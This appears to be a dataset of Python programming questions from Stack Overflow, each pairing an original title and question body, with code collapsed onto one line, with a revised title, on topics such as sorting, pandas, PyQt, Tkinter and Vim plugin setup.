Python function to replace tabs with spaces in a string?," I'm trying to write a python function not using any modules that will take a string that has tabs and replace the tabs with spaces appropriate for an inputted tabstop size. It can't just replace all size-n tabs by n spaces though, since a tab could be 1 to n spaces. I'm really confused, so if anyone could just point me in the right direction I'd greatly appreciate it. For instance,if tabstop is size 4 originally: but changed to tabstop 5: I think I need to pad the end of the string with spaces until string%n==0 and then chunk it, but I'm pretty lost at the moment.. <code>  123\t123 = 123 123 #one space in between 123\t123 = 123 123 #two spaces in between","How to replace custom tabs with spaces in a string, depend on the size of the tab?"
Purpose of a backslash at the end of a line," Just found the following module import in a Python code: I am curious about the backslash \ at the end of the first line. What's the purpose of it? Wouldn't it be the same as the following? <code>  from sqlalchemy.ext.declarative import declarative_base,\ AbstractConcreteBase from sqlalchemy.ext.declarative import declarative_base, AbstractConcreteBase",What is the purpose of a backslash at the end of a line?
Non-latin characters in countVectorizer in Scikit-Learn," Consider this runnable example: The output will be Why is the removed? Note that the vectorizer strip_accents=None is default. I would be really grateful if you could help me with this. <code>  #coding: utf-8from sklearn.feature_extraction.text import CountVectorizervectorizer = CountVectorizer()corpus = ['a hej ho' 'ter aba na', 's p l']x = vectorizer.fit_transform(corpus)l = vectorizer.get_feature_names()for u in l: print u abahejhonater",Special characters in countVectorizer Scikit-learn
Python: How to sort a list of tuples by several values?," I want to sort a list at first by a value and then by a second value. Is there an easy way to do this? Here is a small example: This command is for sorting this list by 'name': But how I can sort this list by a second value? Like 'age' in this example.I want a sorting like this (first sort by 'name' and then sort by 'age'): Thanks! <code>  A = [{'name':'john','age':45}, {'name':'andi','age':23}, {'name':'john','age':22}, {'name':'paul','age':35}, {'name':'john','age':21}] sorted(A, key = lambda user: user['name']) andi - 23john - 21john - 22john - 45paul - 35",Python: How to sort a list of dictionaries by several values?
Python - Is it okay to pass self to an external function," I have a class, A, which is inherited by a bunch of other classes. Some of these have a few functions which are similar and it would be nice to have those functions defined somewhere else and called by the classes that need them. But those functions call functions defined in the super class. So I have created my helper functions which take the self object as an argument and I can call the imp_func from inside the helper functions. This solves the problem.But should I be doing this? Is this Pythonic?  <code>  class A(): def imp_func(*args): # called by the child class functionsClass B(A): def common_func(self): # some stuff self.imp_func(*args) def helper_func(obj, some_args): # some common stuff obj.imp_func(*args)class B(A): def common_func(self): # unique stuff helper_func(self, some_args)",Is it okay to pass self to an external function
virtualenvwrapper and Python 3.3," I installed python 3.3.1 on ubuntu lucid and successfully created a virtualenv as below this created a folder envpy331 on my home dir.I also have virtualenvwrapper installed.But in the docs only 2.4-2.7 versions of python are supported..Has anyone tried to organize the python3 virtualenv ? If so, can you tell me how ? <code>  virtualenv envpy331 --python=/usr/local/bin/python3.3",virtualenvwrapper and Python 3
Is it a good practice to use try-except-else in python?," From time to time in Python, I see the block: What is the reason for the try-except-else to exist?I do not like that kind of programming, as it is using exceptions to perform flow control. However, if it is included in the language, there must be a good reason for it, isn't it?It is my understanding that exceptions are not errors, and that they should only be used for exceptional conditions (e.g. I try to write a file into disk and there is no more space, or maybe I do not have permission), and not for flow control. Normally I handle exceptions as: Or if I really do not want to return anything if an exception happens, then: <code>  try: try_this(whatever)except SomeException as exception: #Handle exceptionelse: return something something = some_default_valuetry: something = try_this(whatever)except SomeException as exception: #Handle exceptionfinally: return something try: something = try_this(whatever) return somethingexcept SomeException as exception: #Handle exception",Is it a good practice to use try-except-else in Python?
Sorting by substring in string Python, I have a list of strings in python that looks like this:Name number number 4-digit numberHow can I sort it by the last number? <code> ,Sorting strings by a substring in Python
Faster alternative to Python's zipfile module (for encyption)?," Is there a noticeably faster alternative to Python 2.7.4 zipfile module (with ZIP_DEFLATED) for zipping a large number of files into a single zip file? I had a look at czipfile https://pypi.python.org/pypi/czipfile/1.0.0, but that appears to be focused on faster decrypting (not compressing).I am routinely having to process a large number of image files (~12,000 files of a combination of .exr and .tiff files) with each file between ~1MB - 6MB in size (and ~9 GB for all the files) into a single zip file for shipment. This zipping takes ~90 minutes to process (running on Windows 7 64bit).If anyone can recommend a different python module (or alternatively a C/C++ library or even a standalone tool) that would be able to compress a large number of files into a single .zip file in less time than the zipfile module, that would be greatly appreciated (anything close to ~5-10% faster (or more) would be very helpful). <code> ",Faster alternative to Python's zipfile module?
AttributeError: 'Class' object has no attribute 'a'," Here I have an attribute 'a', which is defined in first class method and should be changed in second.When calling them in order, this message appears: AttributeError: 'Class' object has no attribute 'a'The only way I've found - define 'a' again in second method, but in real code it has long inheritance and app will be messed.Why doesn't it work? Isn't self.a equal to Class.a? <code>  class Class(object): def method_1(self): self.a = 1 def method_2(self): self.a += 1Class().method_1()Class().method_2()",Attribute created in one method doesn't exist in other method
How to exactly solve quadratic equations from integer coefficients (over integers)?," I read a problem about bullseyes in Google Code Jam. (The contest is over now, so it's okay to talk about it) Maria starts with t millilitres of black paint, which she will use to draw rings of thickness 1cm (one centimetre). A ring of thickness 1cm is the space between two concentric circles whose radii differ by 1cm. Maria draws the first black ring around a white circle of radius r cm. The area of a disk with radius 1cm is cm2. One millilitre of paint is required to cover area cm2. What is the maximum number of black rings that Maria can draw?By my calculations on paper, the area of paint to draw a bullseye with n rings, inner radius r, as a multiple of pi is 2*n**2 + n*(2*r-1)So given t*pi millitres of paint the problem is to find the greatest n such that f(n,r) <= t. This morning I solved that with binary search https://github.com/hickford/codejam/blob/master/2013/1A/bullseye/bullseye.pyI chose binary search over the quadratic equation because I'm very wary of floating point imprecision in this problem t and r are integers as big as 10**18). Arithmetic imprecision bit me in a previous Code Jam.But I'm curious. Can you shore up the quadratic equation to give the correct answer for equations with large integer coefficients? Do maths libraries like Sympy or Numpy have anything to offer me?Demonstration that quadratic equation gives wrong answer for large inputs. For example, with r=308436464205151562 and t=1850618785230909388 . The quadratic equation to solve is ie. the coefficients are Computing in Python This is the wrong answer! The right answer (found by binary search) is 3 <code>  2*n**2 + 616872928410303123*n -1850618785230909388 <= 0 a = 2b = 616872928410303123c = -1850618785230909388 > int((-b + math.sqrt(b**2 - 4*a*c)) / (2*a)) 0 >>> n = 3>>> 2*n**2 + 616872928410303123*n -1850618785230909388 <= 0True",How to exactly solve quadratic equations with large integer coefficients (over integers)?
How to exactly solve quadratic equations with integer coefficients (over integers)?," I read a problem about bullseyes in Google Code Jam. (The contest is over now, so it's okay to talk about it) Maria starts with t millilitres of black paint, which she will use to draw rings of thickness 1cm (one centimetre). A ring of thickness 1cm is the space between two concentric circles whose radii differ by 1cm. Maria draws the first black ring around a white circle of radius r cm. The area of a disk with radius 1cm is cm2. One millilitre of paint is required to cover area cm2. What is the maximum number of black rings that Maria can draw?By my calculations on paper, the area of paint to draw a bullseye with n rings, inner radius r, as a multiple of pi is 2*n**2 + n*(2*r-1)So given t*pi millitres of paint the problem is to find the greatest n such that f(n,r) <= t. This morning I solved that with binary search https://github.com/hickford/codejam/blob/master/2013/1A/bullseye/bullseye.pyI chose binary search over the quadratic equation because I'm very wary of floating point imprecision in this problem t and r are integers as big as 10**18). Arithmetic imprecision bit me in a previous Code Jam.But I'm curious. Can you shore up the quadratic equation to give the correct answer for equations with large integer coefficients? Do maths libraries like Sympy or Numpy have anything to offer me?Demonstration that quadratic equation gives wrong answer for large inputs. For example, with r=308436464205151562 and t=1850618785230909388 . The quadratic equation to solve is ie. the coefficients are Computing in Python This is the wrong answer! The right answer (found by binary search) is 3 <code>  2*n**2 + 616872928410303123*n -1850618785230909388 <= 0 a = 2b = 616872928410303123c = -1850618785230909388 > int((-b + math.sqrt(b**2 - 4*a*c)) / (2*a)) 0 >>> n = 3>>> 2*n**2 + 616872928410303123*n -1850618785230909388 <= 0True",How to exactly solve quadratic equations with large integer coefficients (over integers)?
"How to covert country names to ISO 3166-1 alpha-2 values, using python"," I have a list of countries like: I want to convert them like this: Is there any module or any way to convert them? <code>  countries=['American Samoa', 'Canada', 'France'...] countries=['AS', 'CA', 'FR'...]","How to convert country names to ISO 3166-1 alpha-2 values, using python"
How would one add a colorbar to this example?," In this example the color is correlative to the radius of each bar. How would one add a colorbar to this plot?My code mimics a ""rose diagram"" projection which is essentially a bar chart on a polar projection.here is a part of it: and here is the resulting plot:as you can see, the colorbar is not quite right.I have played around with the code so much and I just can't figure out how to normalize the colorbar correctly. <code>  angle = radians(10.)patches = radians(360.)/angletheta = np.arange(0,radians(360.),angle)count = [0]*patchesfor i, item in enumerate(some_array_of_azimuth_directions): temp = int((item - item%angle)/angle) count[temp] += 1width = angle * np.ones(patches)# force square figure and square axes looks better for polar, IMOfig = plt.figure(figsize=(8,8))ax = fig.add_axes([0.1, 0.1, 0.8, 0.8], polar=True)rmax = max(count) + 1ax.set_rlim(0,rmax)ax.set_theta_offset(np.pi/2)ax.set_thetagrids(np.arange(0,360,10))ax.set_theta_direction(-1)# project strike distribution as histogram barsbars = ax.bar(theta, count, width=width)r_values = []colors = []for r,bar in zip(count, bars): r_values.append(r/float(max(count))) colors.append(cm.jet(r_values[-1], alpha=0.5)) bar.set_facecolor(colors[-1]) bar.set_edgecolor('grey') bar.set_alpha(0.5)# Add colorbar, make sure to specify tick locations to match desired ticklabelscolorlist = []r_values.sort()values = []for val in r_values: if val not in values: values.append(val*float(max(count))) color = cm.jet(val, alpha=0.5) if color not in colorlist: colorlist.append(color)cpt = mpl.colors.ListedColormap(colorlist)bounds = range(max(count)+1)norm = mpl.colors.BoundaryNorm(values, cpt.N-1)cax = fig.add_axes([0.97, 0.3, 0.03, 0.4])cb = mpl.colorbar.ColorbarBase(cax, cmap=cpt, norm=norm, boundaries=bounds, # Make the length of each extension # the same as the length of the # interior colors: extendfrac='auto', ticks=[bounds[i] for i in range(0, len(bounds), 2)], #ticks=bounds, spacing='uniform')",How does one add a colorbar to a polar plot (rose diagram)?
Python: Comparing two lists and only printing the differences? (XORing two lists)," I'm trying to create a function that takes in 2 lists and returns the list that only has the differences of the two lists.Example: The result should print [4,5,7,8]The function so far: The first for loop sorts it, second one removes the duplicates. Problem is the result is [1,2,4,5,7,8,9] not [4,5,7,8], so it doesn't completely remove the duplicates? What can I add to do this. I can't use any special modules, .sort, set or anything, just loops basically.  <code>  a = [1,2,5,7,9]b = [1,2,4,8,9] def xor(list1, list2): list3=list1+list2 for i in range(0, len(list3)): x=list3[i] y=i while y>0 and x<list3[y-1]: list3[y]=list3[y-1] y=y-1 list3[y]=x last=list3[-1] for i in range(len(list3) -2, -1, -1): if last==list3[i]: del list3[i] else: last=list3[i] return list3 print xor([1,2,5,7,8],[1,2,4,8,9])",Comparing two lists and only printing the differences? (XORing two lists)
IPython.parallel does not use multicore," I am experimenting with IPython.parallel and just want to launch several shell command on different engines.I have the following Notebook:Cell 0: And launch the commands:Cell 1: Cell 2: Cell 3: What it does is it uses the mincemeat implementation of MapReduce. When I launch the first !python mincemeat.py 127.0.0.1 it uses roughly 100 % of one core, then when I launch the second it drops to 50 % each. I have 4 cores (+virtual cores) on the machine and can use them when launching directly from the terminal but not in the Notebook.Is there something I am missing? I would like to use one core per !python mincemeat.py 127.0.0.1 command. EDIT:For clarity, here's another thing that's not using multiple cores:Cell 1: Cell 2: I suppose I am missing something. I believe those two cells should run one different cores if available. However, it does not seem to be the case. Again the CPU usage shows that they share the same core and use 50 % of it. What did I do wrong? <code>  from IPython.parallel import Clientclient = Client()print len(client)5 %%px --targets 0 --noblock!python server.py %%px --targets 1 --noblock!python mincemeat.py 127.0.0.1 %%px --targets 2 --noblock!python mincemeat.py 127.0.0.1 %%px --targets 0 --noblocka = 0for i in xrange(100000): for j in xrange(10000): a += 1 %%px --targets 0 --noblocka = 0for i in xrange(100000): for j in xrange(10000): a += 1",IPython.parallel not using multicore?
"Removing duplicates, similar values while preserving the order, with Python Pandas DataFrame"," I have a problem with removing the duplicates. My program is based around a loop which generates tuples (x,y) which are then used as nodes in a graph. The final array/matrix of nodes is : The length of the array is 22. Now, I need to remove the duplicate entries (see **). So I used: Fantastic, but I still get : So drop duplicates is not removing anything. I tested to see if the nodes where actually the same and I get: Why is it not working ??? How can I remove those duplicate values ???One more question....Say two values are ""nearly"" equal (say x1 and x2), is there any way to replace them in a way that they are both equal ???? What I want is to replace x2 with x1 if they are ""nearly"" equal.  <code>  [[ 1. 1. ][ 1.12273268 1.15322175][..........etc..........][ 0.94120695 0.77802849]**[ 0.84301344 0.91660517]**[ 0.93096269 1.21383287]**[ 0.84301344 0.91660517]**[ 0.75506418 1.0798641 ]] def urows(array): df = pandas.DataFrame(array) df.drop_duplicates(take_last=True) return df.drop_duplicates(take_last=True).values 0 10 1.000000 1.000000....... etc...........17 1.039400 1.03032018 0.941207 0.778028**19 0.843013 0.916605**20 0.930963 1.213833**21 0.843013 0.916605** print urows(total_nodes)[19,:]---> [ 0.84301344 0.91660517]print urows(total_nodes)[21,:]---> [ 0.84301344 0.91660517]print urows(total_nodes)[12,:] - urows(total_nodes)[13,:]---> [ 0. 0.]",drop duplicates in Python Pandas DataFrame not removing duplicates
What are the implications of registering a class method with atexit in Python?," Assume I've got some really big Python class that might consume a fair amount of memory. The class has some method that is responsible for cleaning up some things when the interpreter exits, and it gets registered with the atexit module: Various instances of this class might come and go throughout the life of the program. My questions are:Is registering the instance method with atexit safe if I, say, del all my other references to the instance? In other words, does atexit.register() increment the reference counter in the same way as traditional binding would? If so, does the entire class instance now have to hang around in memory and wait until exit because one of its methods has been registered with atexit, or can portions of the instance be garbage collected? What would be the preferred way to structure such a cleanup at exit for transient class instances like this so that garbage collection can happen effectively? <code>  import atexitimport osclass ReallyBigClass(object): def __init__(self, cache_file): self.cache_file = open(cache_file) self.data = <some large chunk of data> atexit.register(self.cleanup) <insert other methods for manipulating self.data> def cleanup(self): os.remove(self.cache_file)",What are the implications of registering an instance method with atexit in Python?
Python PyQt: QTableWidget - get cell value based on header string and row number," For example, I have a PyQt QTableWidget which has 3 columns and 2 rows.The column headers are labeled A, B, and C. This is the excerpt from my current source: My code works and when I select a row in my table.. I get the correct row and col numbers from the selection. What is the code needed to return a cell value for the selected row given a specified header name? If I select row 2 cell 1 ... how can I get the cell value of column C on the same row? <code>  A B C1 2 34 5 6 class myform(QtGui.QMainWindow): def __init__(self, parent=None): super(myform, self).__init__(parent) self.ui = Ui_mygui() self.ui.setupUi(self) self.ui.mytablewidget.cellClicked.connect(self.cell_was_clicked) @QtCore.pyqtSlot() # prevents executing following function twice def cell_was_clicked(self): row = self.ui.mytablewidget.currentItem().row() print ""row="",row col = self.ui.mytablewidget.currentItem().column() print ""col="",col item = self.ui.mytablewidget.horizontalHeaderItem(col).text() print ""item="",item",get cell value based on header string and selected row
Python PyQt: QTableWidget - get cell value based on header string and selected row," For example, I have a PyQt QTableWidget which has 3 columns and 2 rows.The column headers are labeled A, B, and C. This is the excerpt from my current source: My code works and when I select a row in my table.. I get the correct row and col numbers from the selection. What is the code needed to return a cell value for the selected row given a specified header name? If I select row 2 cell 1 ... how can I get the cell value of column C on the same row? <code>  A B C1 2 34 5 6 class myform(QtGui.QMainWindow): def __init__(self, parent=None): super(myform, self).__init__(parent) self.ui = Ui_mygui() self.ui.setupUi(self) self.ui.mytablewidget.cellClicked.connect(self.cell_was_clicked) @QtCore.pyqtSlot() # prevents executing following function twice def cell_was_clicked(self): row = self.ui.mytablewidget.currentItem().row() print ""row="",row col = self.ui.mytablewidget.currentItem().column() print ""col="",col item = self.ui.mytablewidget.horizontalHeaderItem(col).text() print ""item="",item",get cell value based on header string and selected row
I am learning Python from coursera. In this course they use simpleGUI. Can anyone tell me how to integrate simpleGUI with python 2.7 shell, I am learning Python from Coursera. In this course they use SimpleGUI module on CodeSkulptor. Can anyone tell me how to integrate SimpleGUI with python 2.7 and 3.0 shell? <code> ,How to integrate SimpleGUI with Python 2.7 and 3.0 shell
How to integrate simpleGUI with python 2.7 and 3.0 shell, I am learning Python from Coursera. In this course they use SimpleGUI module on CodeSkulptor. Can anyone tell me how to integrate SimpleGUI with python 2.7 and 3.0 shell? <code> ,How to integrate SimpleGUI with Python 2.7 and 3.0 shell
Django 1.5 DeprecationWarning," After upgrading from django 1.3 to django 1.5 I started to see these DeprecationWarnings during the test run: path_to_virtualenv/lib/python2.6/site-packages/django/http/request.py:193: DeprecationWarning: HttpRequest.raw_post_data has been deprecated. Use HttpRequest.body instead.I've searched inside the project for raw_post_data and found nothing. So it was not directly used in the project. Then, I've manually went through INSTALLED_APPS and found that raven module still uses raw_post_data and it was the cause, but..Is it possible to see the cause of DeprecationWarning during the test run? How to make these warnings more verbose? <code> ",Verbose deprecation warnings in Django
Bland-Altman plot in python, Is it possible to make a Bland-Altman plot in Python? I can't seem to find anything about it.Another name for this type of plot is the Tukey mean-difference plot.Example: <code> ,Bland-Altman plot in Python
Trying to use hex() without 0x," The hex() function in python, puts the leading characters 0x in front of the number. Is there anyway to tell it NOT to put them? So 0xfa230 will be fa230.The code is <code>  import fileinputf = open('hexa', 'w')for line in fileinput.input(['pattern0.txt']): f.write(hex(int(line))) f.write('\n')",How to use hex() without 0x in Python?
Disbaled field is considered for validation in WTForms and Flask," I have some fields in page disabled as for example:(using jinja2 templating system) Field is disabled in the form as expected.In my views.py: On doing validate_on_submit() on form submit, it fails with validation error on 'name' field which is disabled. I was hoping that validation ignores disabled field. Is it the right behaviour? If so, can you please let know how to handle such a case?Updated:  <code>  <html><body><form action="""" method=POST> {{ form.name(disabled=True) }} {{ form.title }} -- submit button --</form></body></html> class TeamForm(wtf.Form): name = wtf.TextField(""Team Name"", validators=[validators.Required()]) title = wtf.TextField(""Title"", validators=[validators.Required()])",Disabled field is considered for validation in WTForms and Flask
Sequence in a list satisfying a condition," Assume I have a list of this type: I want to find each index for which the value is the same for the n following indices.I can do it (laboriously) this way: Prints: Is there a better way to do this?  <code>  # 0 1 2 3 4 5 6 7 8 9 10 11 -- list indexli=[-1, -1, 2, 2, -1, 1, 1, 1, 1, 1, -1, -1 ] def sub_seq(li,n): ans={} for x in set(li): ans[x]=[i for i,e in enumerate(li[:-n+1]) if all(x==y for y in li[i:i+n])] ans={k:v for k,v in ans.items() if v} return ansli=[-1, -1, 2, 2, -1, 1, 1, 1, 1, 1, -1, -1] for i in (5,4,3,2): print i, sub_seq(li,i) 5 {1: [5]}4 {1: [5, 6]}3 {1: [5, 6, 7]}2 {1: [5, 6, 7, 8], 2: [2], -1: [0, 10]}",Sequence of elements in a list satisfying a condition
Output Pyodbc cursor output as Python dictionary?," How do I serialize pyodbc cursor output (from .fetchone, .fetchmany or .fetchall) as a Python dictionary?I'm using bottlepy and need to return dict so it can return it as JSON. <code> ",Output pyodbc cursor results as python dictionary
python is dangerous for dealing with binary file?," I read this on Python tutorial: (http://docs.python.org/2/tutorial/inputoutput.html#reading-and-writing-files) Python on Windows makes a distinction between text and binary files; the end-of-line characters in text files are automatically altered slightly when data is read or written. This behind-the-scenes modification to file data is fine for ASCII text files, but itll corrupt binary data like that in JPEG or EXE files. Be very careful to use binary mode when reading and writing such files.I don't quite understand how 'end-of-line characters in text files are altered' will 'corrupt binary data'.Because I feel binary data don't have such things like end-of-line.Can somebody explain more of this paragraph for me? It's making me feel like Python doesn't welcome binary files. <code> ",Is Python dangerous for dealing with binary files?
Lifetime of default function agruments in python," I just started learning python, just got struck by the default argument concept.It is mentioned in python doc that the default argument value of a function is computed only once when the def statement is encountered. This makes a large difference between values of immutable and mutable default function arguments. here the mutable function argument L retains the last assigned value (since the default value is calculated not during function call as like in C)is the lifetime of the default argument's value in python is lifetime of the program (like static variables in C) ?Edit : here during the function call func(3,Lt) the default value of L is preserved, it is not overwritten by Lt.so is default argument have two memory? one for actual default value (with program scope) and other for when an object is passed to it (with scope of function call)? <code>  >>> def func(a,L=[]): L.append(a) return L>>> print(func(1))[1]>>> print(func(2))[1, 2] >>> Lt = ['a','b']>>> print(func(3,Lt))['a', 'b', 3]>>> print(func(4))[1, 2, 4]",Lifetime of default function arguments in python
Vim: how to install the UtilSnips plugin?," I tried installing the UltiSnips plugin, but when Vim is loaded it creates a torrent of errors: What I did:I installed the pathogen plugin, then extracted the contents of 'UltiSnips-2.2.tar.gz' to 'vimfiles/bundle/'What I found for install instructions:http://www.vim.org/scripts/script.php?script_id=2715The instructions only refer to concept of 'installing' as indicating how to get the source code. There are no step by step instructions. After a cursory glance I am lead to believe that the contents of 'UltiSnips-2.2.tar.gz' (provided directly on that page) is identical to the contents of the git repository.Edit with more information:This is gvim on windows XP. :echo has(""python"") returns 1.The relevant bits of :version regarding python is: full contents of :version: <code>  Error detected while processing C:\Documents and Settings\username\vimfiles\bundle\UltiSnips-2.2\plugin\UltiSnips.vim:line 226:Traceback (most recent call last): File ""<string>"", line 1, in <module>ImportError: No module named osline 229:Traceback (most recent call last): File ""<string>"", line 1, in <module> File ""C:\Documents and Settings\username\vimfiles\bundle\UltiSnips-2.2\plugin\UltiSnips\__init__.py"", line 4, in <module> from functools import wrapsImportError: No module named functoolsline 230:Traceback (most recent call last): File ""<string>"", line 1, in <module>NameError: name 'UltiSnips_Manager' is not definedline 231:Traceback (most recent call last): File ""<string>"", line 1, in <module>NameError: name 'UltiSnips_Manager' is not definedline 232:Traceback (most recent call last): File ""<string>"", line 1, in <module>NameError: name 'UltiSnips_Manager' is not defined +python/dyn -python3-DFEAT_PYTHON -DDYNAMIC_PYTHON -DDYNAMIC_PYTHON_DLL=""python26.dll"" VIM - Vi IMproved 7.3 (2010 Aug 15, compiled Jan 4 2011 14:09:41)MS-Windows 32-bit GUI version with OLE supportIncluded patches: 1-98Compiled by digitectNO@SPAMdancingpaper.comHuge version with GUI. Features included (+) or not (-):+arabic +autocmd +balloon_eval +browse ++builtin_terms +byte_offset +cindent +clientserver +clipboard +cmdline_compl +cmdline_hist +cmdline_info +comments +conceal +cryptv +cscope +cursorbind +cursorshape +dialog_con_gui +diff +digraphs -dnd -ebcdic +emacs_tags +eval +ex_extra +extra_search +farsi +file_in_path +find_in_path +float +folding -footer +gettext/dyn -hangul_input +iconv/dyn +insert_expand +jumplist +keymap +langmap +libcall +linebreak +lispindent +listcmds +localmap +lua/dyn +menu +mksession +modify_fname +mouse +mouseshape +multi_byte_ime/dyn +multi_lang +mzscheme/dyn +netbeans_intg +ole -osfiletype +path_extra +perl/dyn +persistent_undo -postscript +printer +profile +python/dyn -python3 +quickfix +reltime +rightleft +ruby/dyn +scrollbind +signs +smartindent -sniff +startuptime +statusline -sun_workshop +syntax +tag_binary +tag_old_static -tag_any_white +tcl/dyn -tgetent -termresponse +textobjects +title +toolbar +user_commands +vertsplit +virtualedit +visual +visualextra +viminfo +vreplace +wildignore +wildmenu +windows +writebackup -xfontset -xim -xterm_save -xpm_w32 system vimrc file: ""$VIM\vimrc"" user vimrc file: ""$HOME\_vimrc"" 2nd user vimrc file: ""$VIM\_vimrc"" user exrc file: ""$HOME\_exrc"" 2nd user exrc file: ""$VIM\_exrc"" system gvimrc file: ""$VIM\gvimrc"" user gvimrc file: ""$HOME\_gvimrc""2nd user gvimrc file: ""$VIM\_gvimrc"" system menu file: ""$VIMRUNTIME\menu.vim""Compilation: gcc -O3 -fomit-frame-pointer -freg-struct-return -fno-strength-reduce -DWIN32 -DHAVE_PATHDEF -DFEAT_HUGE -DWINVER=0x0400 -D_WIN32_WINNT=0x0400 -DFEAT_PERL -DDYNAMIC_PERL -DDYNAMIC_PERL_DLL=""perl58.dll"" -DFEAT_PYTHON -DDYNAMIC_PYTHON -DDYNAMIC_PYTHON_DLL=""python26.dll"" -DFEAT_RUBY -DDYNAMIC_RUBY -DDYNAMIC_RUBY_DLL=""msvcrt-ruby18.dll"" -DDYNAMIC_RUBY_VER=18 -DFEAT_MZSCHEME -DDYNAMIC_MZSCHEME -DDYNAMIC_MZSCH_DLL=""libmzsch42.dll"" -DDYNAMIC_MZGC_DLL=""libmzgc42.dll"" -DINCLUDE_MZSCHEME_BASE -DFEAT_TCL -DDYNAMIC_TCL -DDYNAMIC_TCL_DLL=""tcl85.dll"" -DFEAT_LUA -DDYNAMIC_LUA -DDYNAMIC_LUA_DLL=""lua51.dll"" -DDYNAMIC_GETTEXT -DDYNAMIC_ICONV -DFEAT_MBYTE -DFEAT_MBYTE_IME -DDYNAMIC_IME -DFEAT_CSCOPE -DFEAT_NETBEANS_INTG -DFEAT_GUI_W32 -DFEAT_CLIPBOARD -DFEAT_OLE -march=i386 -Iproto -I/cygdrive/c/strawberry/perl/lib/CORE -I/cygdrive/c/RUBY/lib/ruby/1.8/i386-mswin32 -I/cygdrive/c/PROGRA~1/MzScheme/include -I/cygdrive/c/Tcl/include -I/cygdrive/c/PROGRA~1/Lua/5.1/include -s -mno-cygwinLinking: gcc -s -o gvim.exe -luuid -lole32 /cygdrive/c/Tcl/lib/tclstub85.lib -lwsock32 -mwindows -lcomctl32 -lversion -loleaut32 -lstdc++",Vim: how to install the UltiSnips plugin?
Url decode utf-8 in Python," I have spent plenty of time as far as I am newbie in Python.How could I ever decode such a URL: to this one in python 2.7: example.com?title==+ url=urllib.unquote(url.encode(""utf8"")) is returning something very ugly.Still no solution, any help is appreciated. <code>  example.com?title=%D0%BF%D1%80%D0%B0%D0%B2%D0%BE%D0%B2%D0%B0%D1%8F+%D0%B7%D0%B0%D1%89%D0%B8%D1%82%D0%B0",Url decode UTF-8 in Python
Cant i use **kwargs both in function calling and definition," Suppose I have a function get_data which takes some number of keyword arguments. Is there some way I can do this So the idea is to avoid typing the argument names in both function calling and function definition. I call the function with a dictionary as argument and the keys of the dictionary become local variables of function and their values are the dictionary valuesI tried the above and got error saying global name 'arg2' is not defined. I understand I can change the locals() in the definition of get_data to get the desired behavior.So my code would look like this and it wouldn't work too. Also cant I achieve the behavior without using locals()? <code>  def get_data(arg1, **kwargs): print arg1, arg2, arg3, arg4arg1 = 1data['arg2'] = 2 data['arg3'] = 3 data['arg4'] = 4 get_data(arg1, **data) def get_data(arg1, kwargs): locals().update(kwargs) print arg1, arg2, arg3, arg4arg1 = 1data['arg2'] = 2 data['arg3'] = 3 data['arg4'] = 4 get_data(arg1, data)",Use **kwargs both in function calling and definition
Python - Combine lists by joining strings with matching index values," I have two lists that I would like to combine, but instead of increasing the number of items in the list, I'd actually like to join the items that have a matching index. For example: I've seen quite a few other questions about simply combining two lists, but I'm afraid I haven't found anything that would achieve.Any help would be much appreciated. Cheers. <code>  List1 = ['A', 'B', 'C']List2 = ['1', '2', '3']List3 = ['A1', 'B2', 'C3']",Combine lists by joining strings with matching index values
Tkinter - how do I change the background of a Frame? - Py3.3," I have been creating an Email program using Tkinter, in Python 3.3.On various sites I have been seeing that the Frame widget can get a different background using Frame.config(background=""color"").However, when I use this in my Frames it gives the following error: It does not work when doing the following: Or: I can't figure it out.I would post my whole source code but I dont want it exposed on the internet, but the frame creation goes something like this: I have tried multiple options trying to modify the background. The frame is like a wrap around an email preview for an inbox.In case it's needed, this the way I am importing my modules: The following is the full traceback: Gives the following error with the code from the answer: Solved! Thanks. Its the inbox bar to the right, background needed to be white. <code>  _tkinter.TclError: unknown option ""-Background"" frame = Frame(root, background=""white"") frame = Frame(root)frame.config(bg=""white"") mail1 = Frame(self, relief=SUNKEN)mail1.pack()mail1.place(height=70, width=400, x=803, y=109)mail1.config(Background=""white"") import tkinter, time, base64, imaplib, smtplibfrom imaplib import *from tkinter import *from tkinter.ttk import * Traceback (most recent call last):File ""C:\Users\Wessel\Dropbox\Python\Main\Class Ginomail.py"", line 457, in <module>main()File ""C:\Users\Wessel\Dropbox\Python\Main\Class Ginomail.py"", line 453, in mainapp = Application(root) #start the application with root as the parentFile ""C:\Users\Wessel\Dropbox\Python\Main\Class Ginomail.py"", line 60, in __init__self.initINBOX()File ""C:\Users\Wessel\Dropbox\Python\Main\Class Ginomail.py"", line 317, in initINBOXmail1.config(bg=""white"")File ""C:\Python33\lib\tkinter\__init__.py"", line 1263, in configurereturn self._configure('configure', cnf, kw)File ""C:\Python33\lib\tkinter\__init__.py"", line 1254, in _configureself.tk.call(_flatten((self._w, cmd)) + self._options(cnf))_tkinter.TclError: unknown option ""-bg"" File ""C:\Users\Wessel\Dropbox\Python\Main\Class Ginomail.py"", line 317, in initINBOX mail1 = Frame(self, relief=SUNKEN, style='myframe') File ""C:\Python33\lib\tkinter\ttk.py"", line 733, in __init__ Widget.__init__(self, master, ""ttk::frame"", kw) File ""C:\Python33\lib\tkinter\ttk.py"", line 553, in __init__ tkinter.Widget.__init__(self, master, widgetname, kw=kw) File ""C:\Python33\lib\tkinter\__init__.py"", line 2075, in __init__ (widgetName, self._w) + extra + self._options(cnf)) _tkinter.TclError: Layout myframe not found",How do I change the background of a Frame in Tkinter?
How to can i iterate between bits to evaluate each one in a binary number, How can I iterate and evaluate the value of each bit given a specific binary number in python 3?For example: <code>  00010011 --------------------bit position | value--------------------[0] false (0)[1] false (0)[2] false (0)[3] true (1)[4] false (0)[5] false (0)[6] true (1)[7] true (1),Iterate between bits in a binary number
Getting number of messages in a queue, We're using amqplib to publish/consume messages. I want to be able to read the number of messages on a queue (ideally both acknowledged and unacknowledged). This will allow me to show a nice status diagram to the admin users and detect if a certain component is not keeping up with the load.I can't find any information in the amqplib docs about reading queue status.Can someone point me in the right direction? <code> ,Getting number of messages in a RabbitMQ queue
Is there a difference between 'and' and '&' in python," I got very good help for question check if dictionary key has empty value . But I was wondering if there is a difference between and and & in python? I assume that they should be similar?  <code>  dict1 ={""city"":"""",""name"":""yass"",""region"":"""",""zipcode"":"""", ""phone"":"""",""address"":"""",""tehsil"":"""", ""planet"":""mars""}whitelist = {""name"", ""phone"", ""zipcode"", ""region"", ""city"", ""munic"", ""address"", ""subarea""}result = {k: dict1[k] for k in dict1.viewkeys() & whitelist if dict1[k]}",Is there a difference between 'and' and '&' with respect to python sets?
